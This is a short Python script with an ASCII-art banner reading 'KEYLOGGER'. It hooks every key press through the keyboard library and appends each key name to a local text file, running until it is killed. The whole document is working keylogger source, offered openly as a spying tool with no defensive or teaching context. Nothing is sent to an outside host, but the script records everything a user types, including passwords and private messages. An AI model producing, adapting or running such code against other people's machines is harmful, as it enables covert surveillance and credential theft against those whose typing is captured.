import keyboard

print("""
 __  __     ______     __  __     __         ______     ______     ______     ______     ______    
/\ \/ /    /\  ___\   /\ \_\ \   /\ \       /\  __ \   /\  ___\   /\  ___\   /\  ___\   /\  == \   
\ \  _"-.  \ \  __\   \ \____ \  \ \ \____  \ \ \/\ \  \ \ \__ \  \ \ \__ \  \ \  __\   \ \  __<   
 \ \_\ \_\  \ \_____\  \/\_____\  \ \_____\  \ \_____\  \ \_____\  \ \_____\  \ \_____\  \ \_\ \_\ 
  \/_/\/_/   \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_/ /_/ 
""")                                                                                           


file = r"D:text.txt"

def press(event):
    with open(file, 'a') as f:
        f.write('{} '.format(event.name))

keyboard.on_press(press)
keyboard.wait()
